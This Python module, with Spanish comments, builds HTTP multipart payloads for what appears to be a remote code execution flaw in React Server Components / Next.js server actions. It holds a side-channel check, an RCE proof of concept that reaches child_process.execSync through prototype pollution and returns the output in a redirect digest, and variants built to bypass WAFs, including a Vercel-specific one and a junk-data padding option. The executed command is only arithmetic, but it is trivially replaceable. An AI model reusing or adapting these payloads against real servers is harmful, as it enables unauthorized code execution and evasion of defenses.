"""
Constructor de payloads usando patrón Strategy.
"""
from abc import ABC, abstractmethod
import random
import string


class PayloadStrategy(ABC):
    """Clase base abstracta para estrategias de construcción de payloads."""
    
    @abstractmethod
    def build(self) -> tuple[str, str]:
        """
        Construye el payload.
        
        Returns:
            Tupla de (body, content_type)
        """
        pass


class SafeCheckPayload(PayloadStrategy):
    """
    Payload para verificación segura mediante side-channel.
    No ejecuta código en el servidor objetivo.
    """
    
    def build(self) -> tuple[str, str]:
        """Construye payload de verificación segura."""
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

        body = (
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f"{{}}\r\n"
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f'["$1:aa:aa"]\r\n'
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
        )

        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type


class RCEPayload(PayloadStrategy):
    """
    Payload de prueba de concepto RCE.
    Ejecuta operación matemática determinística (41*271 = 11111).
    """
    
    def __init__(self, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128):
        """
        Inicializa payload RCE.
        
        Args:
            windows: Si True, usa payload de PowerShell para Windows
            waf_bypass: Si True, agrega datos basura para evadir WAF
            waf_bypass_size_kb: Tamaño de datos basura en KB
        """
        self.windows = windows
        self.waf_bypass = waf_bypass
        self.waf_bypass_size_kb = waf_bypass_size_kb
    
    def build(self) -> tuple[str, str]:
        """Construye payload RCE."""
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

        if self.windows:
            # PowerShell payload - escapar comillas dobles para JSON
            cmd = 'powershell -c \\\"41*271\\\"'
        else:
            # Linux/Unix payload
            cmd = 'echo $((41*271))'

        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
            f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )

        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )

        parts = []

        # Agregar datos basura al inicio si WAF bypass está habilitado
        if self.waf_bypass:
            param_name, junk = self._generate_junk_data(self.waf_bypass_size_kb * 1024)
            parts.append(
                f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
                f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
                f"{junk}\r\n"
            )

        parts.extend([
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n",
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n',
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n",
            "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
        ])

        body = "".join(parts)
        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type
    
    @staticmethod
    def _generate_junk_data(size_bytes: int) -> tuple[str, str]:
        """
        Genera datos basura aleatorios para bypass de WAF.
        
        Args:
            size_bytes: Tamaño de datos en bytes
            
        Returns:
            Tupla de (nombre_parametro, datos_basura)
        """
        param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
        return param_name, junk


class VercelWAFBypassPayload(PayloadStrategy):
    """
    Payload específico para bypass de Vercel WAF.
    Usa variante alternativa de estructura multipart.
    """
    
    def build(self) -> tuple[str, str]:
        """Construye payload de bypass Vercel WAF."""
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
            '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
            'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
            '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
        )

        body = (
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="3"\r\n\r\n'
            f'{{"\\"\u0024\u0024":{{}}}}\r\n'
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
        )

        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type


class PayloadFactory:
    """Factory para crear payloads según el modo de verificación."""
    
    @staticmethod
    def create_payload(check_mode: str, windows: bool = False, 
                      waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> PayloadStrategy:
        """
        Crea instancia de payload según el modo.
        
        Args:
            check_mode: Modo de verificación ('safe', 'rce', 'vercel_waf')
            windows: Si True, usa payload de Windows
            waf_bypass: Si True, habilita bypass de WAF
            waf_bypass_size_kb: Tamaño de datos basura en KB
            
        Returns:
            Instancia de PayloadStrategy
            
        Raises:
            ValueError: Si el modo es inválido
        """
        if check_mode == "safe":
            return SafeCheckPayload()
        elif check_mode == "rce":
            return RCEPayload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
        elif check_mode == "vercel_waf":
            return VercelWAFBypassPayload()
        else:
            raise ValueError(f"Modo de verificación inválido: {check_mode}")
